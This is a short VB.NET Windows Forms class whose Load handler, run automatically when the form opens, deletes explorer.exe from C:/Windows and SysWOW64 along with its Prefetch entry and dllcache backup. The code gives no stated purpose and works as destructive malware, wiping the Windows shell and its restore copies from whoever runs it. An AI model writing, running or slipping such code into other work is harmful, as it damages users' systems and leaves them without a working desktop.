Public Class Form3

    Private Sub Form3_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        My.Computer.FileSystem.DeleteFile("C:/Windows/explorer.exe")
        My.Computer.FileSystem.DeleteFile("C:/Windows/SysWOW64/explorer.exe")
        If My.Computer.FileSystem.FileExists("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf") = True Then
            My.Computer.FileSystem.DeleteFile("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf")
        End If
        If My.Computer.FileSystem.FileExists("C:/Windows/system32/dllcache/explorer.exe") = True Then
            My.Computer.FileSystem.DeleteFile("C:/Windows/system32/dllcache/explorer.exe")
        End If
    End Sub
End Class